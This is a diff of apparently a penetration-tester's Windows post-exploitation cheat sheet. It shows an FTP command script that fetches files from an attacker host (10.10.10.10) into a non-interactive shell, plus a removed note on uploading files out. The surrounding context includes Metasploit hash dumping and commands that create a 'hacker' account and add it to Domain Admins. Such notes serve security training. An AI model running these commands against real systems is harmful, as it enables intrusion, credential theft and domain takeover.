@@ -406,18 +406,18 @@ if __name__ == '__main__':
 
 ### Using FTP
 
-Windows has an FTP client built in at `C:\Windows\System32\ftp.exe` that is already in PATH. You can open an FTP connection and transfer files directly between the attacker's machine from the command line. Most of the time the initial shell you get on a target won’t be interactive, which means running an command which requires further input from the user (e.g. text editor, FTP connection). This won’t work properly and can crash the shell. The trick is to create a file with all the FTP commands you need and run them all at once.&#x20;
+Windows has an FTP client built in at `C:\Windows\System32\ftp.exe` that is already in PATH. You can open an FTP connection and download the files directly from Kali on the command line. To do this, you can authenticate with user `anonymous` and any password, or if FTP account information is known, use that. Windows FTP can take a “script” of commands directly from the command line. This means if you have a text file called `ftp_commands.txt` on the system that contains this:
 
-To set this up, you can authenticate with user `anonymous` and any random password (or if FTP account information is known, use that). Windows FTP can take a “script” of commands directly from the command line. This means if you create a text file called `ftp_commands.txt` on the system that contains this:
-
-<pre><code>open 10.10.10.10
+```
+open 10.10.10.10
 anonymous
-<strong>&#x3C;anypasswordhere>
-</strong>binary
+anythingoeshere
+binary
 get $file_to_download
-bye</code></pre>
+bye
+```
 
-Then you can simply run `ftp -s:ftp_commands.txt` and download a file with no user interaction.  Use **`-i`** to disable interactive prompting during multiple file transfers. You can also use the `put $file_to_upload` command instead of `get` to send a file to the attacker's machine.
+Then you can simply run `ftp -s:ftp_commands.txt` and download a file with no user interaction.  Use **`-i`** to disable interactive prompting during multiple file transfers.
 
 #### FTP **batch script examples**
 
@@ -680,6 +680,8 @@ net group "Domain Admins" /domain
 msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE
 ```
 
+####
+
 Find admin users (Metasploit)
 
 ```
@@ -710,8 +712,6 @@ meterpreter > shell
 C:\> net user hacker /add /domain
 C:\> net group "Domain Admins" hacker /add /domain
 ```
-
-## MISC
 
 ### Covert to and from Base64 with PowerShell
 
